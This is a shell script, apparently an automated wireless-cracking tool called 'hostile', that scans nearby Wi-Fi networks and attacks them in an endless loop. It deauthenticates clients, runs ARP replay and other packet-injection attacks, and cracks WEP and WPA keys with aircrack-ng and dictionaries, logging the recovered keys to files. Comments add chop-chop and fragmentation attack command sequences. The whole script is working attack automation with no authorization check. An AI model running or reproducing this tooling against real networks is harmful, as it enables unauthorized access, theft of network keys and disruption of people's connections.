#!/bin/sh

H_ME=${0##*/}
H_MY_D=${0%/*}
H_MY_D=$(cd $H_MY_D; pwd)
H_MY_WD=$(pwd)
H_MY_PID=$$
H_VERSION="0.4.0"

h_usage() {
	cat << _END_OF_USAGE_

Usage: $H_ME OPTIONS

Scan its wireless environment and try to "play" with it

Options:
	-b,--bssid BSSID      restrict exploration to the specified BSSID
	-c,--channel CHANNEL  restrict exploration to the specified channel

	-E,--exclude FILE     exclude networks using patterns from FILE
	-I,--include FILE     include networks using patterns from FILE

	-l,--log-file FILE    log activity to the specified file
	-L,--lib-dir DIR      use the specified lib directory
	                      (for helper functions & scripts)
	-p,--pid-file FILE    log pid to the specified file
	-R,--run-dir DIR      use the specified run directory
	                      (for temporary files storage)

	-v,--verbose          be verbose (use multiple time to increase
	                      verbosity level)

	-V,--version          display program version and exit
	-h,--help             display program usage and exit

_END_OF_USAGE_
}

h_version() {
	cat << _END_OF_VERSION_
$H_ME v$H_VERSION, Copyright (C) 2009 /tmp/lap <contact@tmplab.org>

This program is free and excepted software; you can use it, redistribute it
and/or modify it under the terms of the Exception General Public License as
published by the Exception License Foundation; either version 2 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the Exception General Public License for more
details.

You should have received a copy of the Exception General Public License along
with this project; if not, write to the Exception License Foundation.

See http://www.egpl.info/projects/15
_END_OF_VERSION_
}

h_error() {
	echo "$H_ME: $@"
	exit 1
}

H_OPT_VERBOSE=0

H_REFRESH_DELAY=20

h_get_op_modes() {
	local ifs
	ifs=$IFS
	IFS=,
	for mode in $H_OP_MODES; do
		eval "H_OP_MODE_$mode=1"
	done
	IFS=$ifs
}

h_get_options() {
	while [ -n "$1" ]; do
		case $1 in
			-b|--bssid)
				shift
				H_OPT_BSSID=$1
				;;
			-c|--channel)
				shift
				H_OPT_CHANNEL=$1
				;;
			-C|--config-file)
				shift
				H_OPT_CONFIG_F=$1
				;;
			-E|--exclude)
				shift
				H_OPT_EXCL_F="${H_OPT_EXCL_F}${H_OPT_EXCL_F:+ }$1"
				;;
			-I|--include)
				shift
				H_OPT_INCL_F="${H_OPT_INCL_F}${H_OPT_INCL_F:+ }$1"
				;;
			-l|--log-file)
				shift
				H_OPT_LOG_F=$1
				;;
			-L|--lib-dir)
				shift
				H_OPT_LIB_D=$1
				;;
			-p|--pid-file)
				shift
				H_OPT_PID_F=$1
				;;
			-R|--run-dir)
				shift
				H_OPT_RUN_D=$1
				;;
			-v|--verbose)
				H_OPT_VERBOSE=$(($H_OPT_VERBOSE + 1))
				;;
			-vv)
				H_OPT_VERBOSE=$(($H_OPT_VERBOSE + 2))
				;;
			-vvv)
				H_OPT_VERBOSE=$(($H_OPT_VERBOSE + 3))
				;;
			-h|--help)
				h_usage
				exit 0
				;;
			-V|--version)
				h_version
				exit 0
				;;
			*)
				h_error "unknown option '$1'"
				exit 1
				;;
		esac
		shift
	done
}

h_now() {
	date +%s
}

h_log() {
	local level
	local time_now
	local time_str
	local t
	local h
	local m
	local s

	level=$1
	shift

	[ $level -le $H_OPT_VERBOSE ] || return
	time_now=$(h_now)
	t=$(($time_now - $H_TIME_START))
	h=$(($t / 3600))
	t=$(($t % 3600))
	m=$(($t / 60))
	s=$(($t % 60))
	time_str=$(printf "%.2d:%.2d:%.2d" $h $m $s)
	echo "$H_ME [$time_str]: $@" >>$H_LOG_F
}

h_detect_small_storage() {
	local flag_big
	flag_big=0
	for avail in $(df -k |grep -iv '1K-blocks' |fgrep -v '100%' | awk '{ print $2; }')
	do
		# 100000 == 100M, XXX Should move this limit to hostile.conf file?
		[ $avail -gt 100000 ] && flag_big=1
	done
	if [ $flag_big -le 0 ]
	then
		export H_SMALL_STORAGE=1
		h_log 1 "Small or no storage available, avoiding hard-disk needy applications... H_SMALL_STORAGE=$H_SMALL_STORAGE"
		H_OP_MODE_wep_attack=0
	fi
}

#
# @function
#  h_rel2abs
# @description
#  convert relative path to absolute
# @arguments
#  relpath1 relpath2 ... relpathN
# @returns
#  string containting absolute path(s) for each argument
# @examples
#  abs=$(h_rel2abs "./hostile.d")
#
h_rel2abs() {
	local p
	local r
	local d
	local f
	local wd
	r=""
	wd=$(pwd)
	for p in $*; do
		d=${p%/*}
		f=${p##*/}
		cd $d >/dev/null 2>&1 \
			|| h_error "can't use directory '$d' ('$p')"
		d=$(pwd)
		cd $wd
		r="${r}${r:+ }${d}/${f}"
	done
	echo "$r"
}

h_startup() {
	H_TIME_START=$(h_now)
	if [ -n "$H_OPT_CONFIG_F" ]; then
		H_CONFIG_F=$H_OPT_CONFIG_F
	elif [ -f /etc/hostile.conf ]; then
		H_CONFIG_F=/etc/hostile.conf
	elif [ -f $H_MY_D/hostile.conf ]; then
		H_CONFIG_F=$H_MY_D/hostile.conf
	else
		h_error "can't find any config file, use a '--config-file' option"
	fi
	[ -r $H_CONFIG_F ] \
		&& . $H_CONFIG_F \
		|| h_error "can't read config file '$H_CONFIG_F'"

	[ -n "$H_OPT_EXCL_F" ] \
		&& H_EXCL_F=$H_OPT_EXCL_F
	[ -n "$H_OPT_INCL_F" ] \
		&& H_INCL_F=$H_OPT_INCL_F
	[ -n "$H_OPT_LIB_D" ] \
		&& H_LIB_D=$H_OPT_LIB_D
	[ -n "$H_OPT_LOG_F" ] \
		&& H_LOG_F=$H_OPT_LOG_F
	[ -n "$H_OPT_PID_F" ] \
		&& H_PID_F=$H_OPT_PID_F
	[ -n "$H_OPT_RUN_D" ] \
		&& H_RUN_D=$H_OPT_RUN_D

	H_EXCL_F=$(h_rel2abs $H_EXCL_F)

	H_INCL_F=$(h_rel2abs $H_INCL_F)

	[ -n "$H_LIB_D" ] \
		|| h_error "can't use library directory, 'H_LIB_D' not set"
	H_LIB_D=$(h_rel2abs $H_LIB_D)

	[ -n "$H_LOG_F" ] \
		|| h_error "can't use log file, 'H_LOG_F' not set"
	touch $H_LOG_F >/dev/null 2>&1 \
		|| h_error "can't create log file '$H_LOG_F'"
	H_LOG_F=$(h_rel2abs $H_LOG_F)
	
	[ -n "$H_PID_F" ] \
		|| h_error "can't use pid file, 'H_PID_F' not set"
	touch $H_PID_F >/dev/null 2>&1 \
		|| h_error "can't create pid file '$H_PID_F'"
	H_PID_F=$(h_rel2abs $H_PID_F)
	
	[ -n "$H_RUN_D" ] \
		|| h_error "can't use run directory, 'H_RUN_D' not set"
	mkdir -p $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't create run directory '$H_RUN_D'"
	H_RUN_D=$(h_rel2abs $H_RUN_D)

	H_TMP_D=$(mktemp -d $H_RUN_D/hostile-XXXXXX) \
		|| h_error "can't create tmp directory in '$H_RUN_D'"
	cd $H_TMP_D >/dev/null 2>&1 \
		|| h_error "can't use tmp directory '$H_TMP_D'"
	
	H_WEP_F=$H_RUN_D/hostile-wep.txt
	touch $H_WEP_F >/dev/null 2>&1 \
		|| h_error "can't create wep key file '$H_WEP_F'"

	H_WPA_F=$H_RUN_D/hostile-wpa.txt
	touch $H_WPA_F >/dev/null 2>&1 \
		|| h_error "can't create wpa key file '$H_WPA_F'"

	h_log 0 "starting"
	h_log 1 "using config file: $H_CONFIG_F"
	h_log 1 "using lib directory: $H_LIB_D"
	h_log 1 "using run directory: $H_RUN_D"
	h_log 1 "using tmp directory: $H_TMP_D"
	for f in $H_EXCL_F; do
		h_log 1 "using exclude file: $f"
	done
	for f in $H_INCL_F; do
		h_log 1 "using include file: $f"
	done

	h_get_op_modes
	h_detect_small_storage

	for M in $H_LIB_D/[0-9][0-9]-*.sh; do
		h_log 1 "loading module: $M"
		. $M
	done

	echo "$H_MY_PID" > $H_PID_F
	trap h_abort INT TERM

	h_hook_call_handlers on_app_starting
	h_hook_call_handlers on_wifi_startup
	h_hook_call_handlers on_app_started
}

h_cleanup() {
	h_hook_call_handlers on_app_ending
	h_auth_stop
	h_crack_stop
	h_replay_stop
	h_capture_stop
	sleep 1
	h_hook_call_handlers on_wifi_cleanup
	h_hook_call_handlers on_app_ended

	h_log 0 "ended"
}

h_abort() {
	h_log 0 "caught ABORT, exiting gracefully"
	h_cleanup
	exit 1
}

h_hw_prepare() {
	local plop
	local rate
	if [ "$H_CUR_CHANNEL" != "$H_OLD_CHANNEL" ]; then
		h_hook_call_handlers on_channel_changing
		plop=1
	fi
	if [ "$H_CUR_RATE" != "$H_OLD_RATE" ]; then
		h_hook_call_handlers on_rate_changing
		plop=1
	fi
	if [ -n "$plop" ]; then
		ifconfig $H_MON_IF down
		if [ "$H_CUR_CHANNEL" != "$H_OLD_CHANNEL" ]; then
			h_log 1 "switching to channel: $H_CUR_CHANNEL"
			iwconfig $H_MON_IF channel $H_CUR_CHANNEL
			H_OLD_CHANNEL=$H_CUR_CHANNEL
			h_hook_call_handlers on_channel_changed
		fi
		if [ "$H_CUR_RATE" != "$H_OLD_RATE" ]; then
			[ $H_CUR_RATE -le 11 ] && rate="11M" || rate="54M"
			h_log 1 "ajusting bit rate to: $rate"
			iwconfig $H_MON_IF rate $rate
			H_OLD_RATE=$H_CUR_RATE
			h_hook_call_handlers on_rate_changed
		fi
		return 0
	fi
	return 1
}

# XXX: TODO Move to event based, after each WEP/WPA network attack
# XXX: Idea for the hardcoded repository? Maybe should put that in a hostile.conf variable?
h_if_volatile_backup_results() {
	if [ $(df . | grep -v "Filesystem" |awk '{ print $1; }') = "tmpfs"  -a "$H_SMALL_STORAGE" -eq 1 ]
	then
		cat $H_WEP_F /root/hostile/hostile-wep.txt 2>/dev/null | sort -u > /tmp/temp-wep.txt ; mv /tmp/temp-wep.txt /root/hostile/hostile-wep.txt
		cat $H_WPA_F /root/hostile/hostile-wpa.txt 2>/dev/null | sort -u > /tmp/temp-wpa.txt ; mv /tmp/temp-wpa.txt /root/hostile/hostile-wpa.txt
	fi
}

h_get_last_file() {
	echo $(ls -1 $* | tail -n 1)
}

h_get_sane_fname() {
	local F
	F=$1
	echo $F | tr ':/' '__'
}


h_auth_start() {
	$@ >/dev/null 2>&1 &
	H_AUTH_PID="$! $H_AUTH_PID"
	return 0
}

h_auth_stop() {
	local pid
	for pid in $H_AUTH_PID; do
		kill -TERM $pid 2>/dev/null
	done
	unset H_AUTH_PID
	return 0
}


h_capture_start() {
	[ -z "$H_CAPTURE_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CAPTURE_PID=$!
	return 0
}

h_capture_stop() {
	[ -n "$H_CAPTURE_PID" ] || return 1
	kill -TERM $H_CAPTURE_PID 2>/dev/null
	unset H_CAPTURE_PID
	return 0
}


h_crack_start() {
	[ -z "$H_CRACK_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CRACK_PID=$!
	H_CRACK_TIME_STARTED=$(h_now)
	return 0
}

h_crack_stop() {
	[ -n "$H_CRACK_PID" ] || return 1
	kill -TERM $H_CRACK_PID 2>/dev/null
	unset H_CRACK_TIME_STARTED
	unset H_CRACK_PID
	return 0
}


h_replay_start() {
	[ -z "$H_REPLAY_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_REPLAY_PID=$!
	return 0
}

h_replay_stop() {
	[ -n "$H_REPLAY_PID" ] || return 1
	kill -TERM $H_REPLAY_PID 2>/dev/null
	unset H_REPLAY_PID
	return 0
}


h_capture() {
	local cmd
	cmd="airodump-ng $H_MON_IF $*"
	h_log 2 "running: $cmd"
	exec $cmd
}

h_monitor_all() {
	local n_open
	local n_wep
	local n_wpa

	h_log 1 "monitoring *ALL* traffic for $H_MONITOR_TIME_LIMIT seconds"

	ifconfig $H_MON_IF down
	iwconfig $H_MON_IF channel 0

	h_capture_start h_capture --write ALL ${H_OPT_BSSID:+--bssid $H_OPT_BSSID} ${H_OPT_CHANNEL:+--channel $H_OPT_CHANNEL} -f 250 --output-format=csv,kismet
	sleep $H_MONITOR_TIME_LIMIT
	h_capture_stop
	
	sleep 1

	H_ALL_CSV_F=$(h_get_last_file ALL-??.csv)
	H_ALL_KIS_F=$(h_get_last_file ALL-??.kismet.csv)

	H_NET_OPEN_F=ALL-OPEN.txt
	H_NET_WEP_F=ALL-WEP.txt
	H_NET_WPA_F=ALL-WPA.txt
	H_NET_ESSIDS_F=ALL-ESSIDS.txt
	h_kis_get_networks_by_enc $H_ALL_KIS_F "O" >$H_NET_OPEN_F
	h_kis_get_networks_by_enc $H_ALL_KIS_F "WEP" >$H_NET_WEP_F
	h_kis_get_networks_by_enc $H_ALL_KIS_F "WPA" >$H_NET_WPA_F
	h_kis_get_essids $H_ALL_KIS_F >$H_NET_ESSIDS_F

	n_open=$(wc -l <$H_NET_OPEN_F)
	n_wep=$(wc -l <$H_NET_WEP_F)
	n_wpa=$(wc -l <$H_NET_WPA_F)
	h_log 1 "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
}


h_net_switch() {
	local N
	N=$1
	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
}

h_net_allowed_cb() {
	local value
	local pattern
	value="" # $1 is ignored, will be generated depending on the pattern
	pattern="$2"
	# if the pattern contains BSSID="...", then use the current BSSID for matching
	echo "$pattern" | grep -q 'BSSID=".*"' \
		&& value="BSSID=\"${H_CUR_BSSID}\""
	# if the pattern contains CHANNEL="...", then use the current CHANNEL for matching
	echo "$pattern" | grep -q 'CHANNEL=".*"' \
		&& value="${value}${value:+\s+}CHANNEL=\"${H_CUR_CHANNEL}\""
	# if the pattern contains ESSID="...", then use the current ESSID for matching
	echo "$pattern" | grep -q 'ESSID=".*"' \
		&& value="${value}${value:+\s+}ESSID=\"${H_CUR_ESSID}\""
	h_regex_match "$value" "$pattern"
}

h_net_allowed() {
	if [ -n "$H_EXCL_F" ]; then
		for f in $H_EXCL_F; do
			if cat $f | grep -v "^#" | h_regex_loop_match "" h_net_allowed_cb; then
				h_log 2 "excluded network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'), found in '$f'"
				return 1
			fi
		done
	fi
	if [ -n "$H_INCL_F" ]; then
		for f in $H_INCL_F; do
			if cat $f | grep -v "^#" | h_regex_loop_match "" h_net_allowed_cb; then
				h_log 2 "included network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'), found in '$f'"
				return 0
			fi
		done
		return 1
	fi
	return 0
}


#
# handle open networks
#

h_open_try_one_network() {
	local N
	N=$1
	h_net_switch $N
	h_net_allowed || return 0
	h_log 1 "found open network: bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
}

h_open_try_all_networks() {
	for N in $(cat $H_NET_OPEN_F); do
		h_open_try_one_network $N
	done
}


#
# handle WEP networks
#

h_wep_wait_for_iv() {
	local iv
	local iv_min
	local time
	local time_start
	local time_elapsed

	iv_min=$1
	h_log 1 "waiting $iv_min IVs for $H_INJECTION_TIME_LIMIT seconds"
	time_start=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
		h_log 1 "got $iv IVs so far"
		[ $iv -ge $iv_min ] && return 0
	done
	h_log 1 "not enough IVs captured"
	return 1
}

h_wep_log_key() {
	local key
	key=$(cat $H_CUR_KEY_F)
	h_log 0 "key found: $key  (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
	H_WEP_CHANNEL=$H_CUR_CHANNEL
}

h_wep_attack_is_working() {
	local iv
	local iv_last
	local time
	local time_last
	local time_start
	local time_elapsed
	local div
	local dtime
	local iv_rate

	time_start=$(h_now)
	iv_last=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
	time_last=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
		div=$(($iv - $iv_last))
		dtime=$(($time - $time_last))
		iv_rate=$(($div / $dtime))
		h_log 1 "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
		iv_last=$iv
		time_last=$time
	done
	return 1
}

h_wep_attack_try() {
	local replay_func
	local auth_func
	local clients
	local iv
	local crack_time_started
	local RC
	
	replay_func=$1

	h_replay_start $replay_func
	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
	else
		h_log 1 "no client station found"
		h_auth_start h_wep_auth_fake1
	fi

	RC=1
	if h_wep_attack_is_working; then
		h_log 1 "attack seems to be working \o/ :)"
		h_hook_call_handlers on_wep_attack_working
		while [ 1 ]; do
			iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
			if [ $iv -ge $H_IV_MIN ]; then
				if [ $iv -ge $H_IV_MAX ]; then
					h_log 1 "max IVs limit ($H_IV_MAX) reached"
					break
				fi
				if [ -z "$crack_time_started" ]; then
					h_log 1 "min IVs limit ($H_IV_MIN) reached"
					h_crack_start h_wep_crack
					crack_time_started=$(h_now)
				else
					local crack_time=$(h_now)
					local crack_time_elapsed=$(($crack_time - $crack_time_started))
					if [ $crack_time_elapsed -ge $H_CRACK_TIME_LIMIT ]; then
						h_log 1 "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
						break
					fi
				fi
			fi
			if [ -f $H_CUR_KEY_F ]; then
				h_hook_call_handlers on_wep_key_found
				h_wep_log_key
				RC=0
				break
			fi
			if ! h_wep_attack_is_working; then
				h_log 1 "attack stalled, aborting"
				break
			fi
		done
	fi

	h_crack_stop
	h_auth_stop
	h_replay_stop

	return $RC
}

h_wep_bruteforce_try() {
	local clients
	local country
	local dicts
	local words
	local RC

	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
		sleep 1
	else
		h_log 1 "no client station found"
	fi

	#country=$(get_country_from_ssid $H_CUR_ESSID)
	country="fr"	

	RC=1
	if h_wep_wait_for_iv 4; then
		h_log 1 "BF can start \o/ :)"
		for keysize in 64 128; do
			dicts=${H_LIB_D}/dict/${country}-wep${keysize}-???.dict
			for dict in $dicts; do
				[ -f $dict ] || continue
				words=$(wc -l $dict | awk '{ print $1; }')
				h_log 1 "trying dict '$dict' ($words words)"
				h_wep_dict_crack $keysize $dict
				if [ -f $H_CUR_KEY_F ]; then
					h_hook_call_handlers on_wep_key_found
					h_wep_log_key
					RC=0
					break
				fi
			done
		done
		if [ $RC -gt 0 ]; then
			h_log 1 "BF failed"
		fi
	fi

	h_auth_stop

	return $RC
}

h_wep_crack() {
	local cmd
	cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
	h_log 2 "running: $cmd"
	exec $cmd
}

h_wep_dict_crack() {
	local cmd
	local keysize
	local dictfile
	keysize=$1
	dictfile=$2
	cmd="aircrack-ng -w $dictfile -n $keysize -a 1 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
	h_log 2 "running: $cmd"
	$cmd 2>&1 >/dev/null
}

h_wep_auth() {
	local cmd
	cmd="aireplay-ng $H_MON_IF $*"
	h_log 2 "running: $cmd"
	exec $cmd
}

h_wep_auth_fake1() {
	h_wep_auth -1 6000 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 1 -q 10
}

h_wep_auth_fake2() {
	h_wep_auth -1 0 -b $H_CUR_BSSID -e $H_CUR_ESSID
}

h_wep_auth_fake3() {
	h_wep_auth -1 5 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 10 -q 1
}

h_wep_deauth() {
	h_wep_auth -0 1 -a $H_CUR_BSSID $*
}

# Chop-Chop
#aireplay-ng ath1 --chopchop -F -b AP -h STA
#packetforge-ng -0 -a AP -h STA -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

# Fragmentation Attack
#aireplay-ng ath1 -5 -b AP -h STA -k TARGET -l SOURCE
#packetforge-ng -0 -a AP -h STA -k TARGET -l SOURCE -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

h_wep_replay() {
	local cmd
	cmd="aireplay-ng $H_MON_IF $*"
	if [ $H_INJECTION_RATE_LIMIT -gt 0 ]; then
		cmd="$cmd -x $H_INJECTION_RATE_LIMIT"
	fi
	h_log 2 "running: $cmd"
	exec $cmd
}

h_wep_replay_arp1() {
	h_wep_replay -3 -b $H_CUR_BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_arp2() {
	h_wep_replay -2 -b $H_CUR_BSSID -c FF:FF:FF:FF:FF:FF -p 0841 -F ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_caffe_latte() {
	h_wep_replay -6 -b $H_CUR_BSSID -D
}

h_wep_replay_hilte() {
	h_wep_replay -7 -b $H_CUR_BSSID -D
}

h_wep_try_arp_replay_1() {
	h_log 1 "trying ARP replay attack (1)"
	h_wep_attack_try "h_wep_replay_arp1"
	return $?
}

h_wep_try_arp_replay_2() {
	h_log 1 "trying ARP replay attack (2)"
	h_wep_attack_try "h_wep_replay_arp2"
	return $?
}

h_wep_try_caffe_latte() {
	h_log 1 "trying Caffe-Latte"
	h_wep_attack_try "h_wep_replay_caffe_latte"
	return $?
}

h_wep_try_hilte() {
	h_log 1 "trying Hilte"
	h_wep_attack_try "h_wep_replay_hilte"
	return $?
}

H_WEP_ATTACKS=" \
	h_wep_try_arp_replay_1 \
	h_wep_try_arp_replay_2 \
"

h_wep_attack() {
	local capture_options
	h_wep_key_found && return

	h_log 1 "trying WEP attack mode"

	h_hook_call_handlers on_wep_attack_started
	
	h_hw_prepare
	
	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CUR_CAP_FEXT="ivs"
		capture_options="--output-format=ivs,csv"
	else
		H_CUR_CAP_FEXT="cap"
		capture_options="--output-format=pcap,csv"
	fi
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	for attack in $H_WEP_ATTACKS; do
		$attack && break
	done

	h_capture_stop

	h_hook_call_handlers on_wep_attack_ended
}

h_wep_bruteforce() {
	local capture_options
	h_wep_key_found && return

	h_log 1 "trying WEP bruteforce mode"

	h_hook_call_handlers on_wep_bruteforce_started
	
	h_hw_prepare
	
	h_log 1 "monitoring AP traffic for $H_MONITOR_TIME_LIMIT seconds"
	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CUR_CAP_FEXT="ivs"
		capture_options="--output-format=ivs,csv"
	else
		H_CUR_CAP_FEXT="cap"
		capture_options="--output-format=pcap,csv"
	fi
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	h_wep_bruteforce_try

	h_capture_stop

	h_hook_call_handlers on_wep_bruteforce_ended
}

h_wep_key_found() {
	grep -q "^$H_CUR_BSSID," $H_WEP_F 2>/dev/null
}

h_wep_try_one_network() {
	local N
	N=$1
	h_net_switch $N
	h_net_allowed || return 0

	if h_wep_key_found; then
		h_log 1 "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
		return 0
	fi

	h_log 1 "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"

	[ "$H_OP_MODE_wep_bruteforce" = "1" ] && h_wep_bruteforce
	[ "$H_OP_MODE_wep_attack" = "1" ] && h_wep_attack
}

h_wep_try_all_networks() {
	for N in $(cat $H_NET_WEP_F); do
		h_wep_try_one_network $N
		h_if_volatile_backup_results
	done
}


#
# handle WPA networks
#

h_wpa_dict_crack() {
	local cmd
	local dictfile
	dictfile=$1
	cmd="aircrack-ng -w $dictfile -a 2 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
	h_log 2 "running: $cmd"
	$cmd 2>&1 >/dev/null
}

h_wpa_wait_for_hs() {
	local time
	local time_start
	local time_elapsed
	local wpa_hs_f

	h_log 1 "waiting WPA handshake for $H_INJECTION_TIME_LIMIT seconds"
	time_start=$(h_now)
	wpa_hs_f=$(echo $H_CUR_CSV_F | sed -e 's,\.csv,\.wpa_hs,')
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		[ -f $wpa_hs_f ] && return 0
	done
	h_log 1 "no WPA handshake captured"
	return 1
}

h_wpa_key_found() {
	grep -q "^$H_CUR_BSSID," $H_WPA_F 2>/dev/null
}

h_wpa_key_log() {
	local key
	key=$(cat $H_CUR_KEY_F)
	h_log 0 "key found: $key (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WPA_F
	H_WPA_CHANNEL=$H_CUR_CHANNEL
}

h_wpa_bruteforce_try() {
	local clients
	local country
	local dicts
	local words
	local RC

	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
		sleep 1
	else
		h_log 1 "no client station found"
	fi

	#country=$(get_country_from_ssid $H_CUR_ESSID)
	country="fr"	

	RC=1
	if h_wpa_wait_for_hs; then
		h_log 1 "BF can start \o/ :)"
		dicts=${H_LIB_D}/dict/${country}-wpa-???.dict
		for dict in $dicts; do
			[ -f $dict ] || continue
			words=$(wc -l $dict | awk '{ print $1; }')
			h_log 1 "trying dict '$dict' ($words words)"
			h_wpa_dict_crack $dict
			if [ -f $H_CUR_KEY_F ]; then
				h_hook_call_handlers on_wpa_key_found
				h_wpa_key_log
				RC=0
				break
			fi
		done
		if [ $RC -gt 0 ]; then
			h_log 1 "BF failed"
		fi
	fi

	h_auth_stop

	return $RC
}

h_wpa_bruteforce() {
	local capture_options
	h_wpa_key_found && return

	h_log 1 "trying WPA bruteforce mode"

	h_hook_call_handlers on_wpa_bruteforce_started
	
	h_hw_prepare
	
	h_log 1 "monitoring AP traffic for $H_MONITOR_TIME_LIMIT seconds"
	H_CUR_CAP_FEXT="ivs"
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL --output-format=ivs,csv

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	h_wpa_bruteforce_try

	h_capture_stop

	h_hook_call_handlers on_wpa_bruteforce_ended
}

h_wpa_try_one_network() {
	local N
	N=$1
	h_net_switch $N
	h_net_allowed || return 0

	if h_wpa_key_found; then
		h_log 1 "skipping known WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
		return 0
	fi

	h_log 1 "trying WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"

	[ "$H_OP_MODE_wpa_bruteforce" = "1" ] && h_wpa_bruteforce
}

h_wpa_try_all_networks() {
	for N in $(cat $H_NET_WPA_F); do
		h_wpa_try_one_network $N
		# Only if we're on a device with not much storage, we remove the possibly large .cap files
		[ -n "$H_SMALL_STORAGE" ] && rm *.cap
		h_if_volatile_backup_results
	done
}


h_get_options $@
h_startup
while [ 1 ]; do
	h_monitor_all
	h_open_try_all_networks
	h_wep_try_all_networks
	h_wpa_try_all_networks
	sleep 1
done
h_cleanup
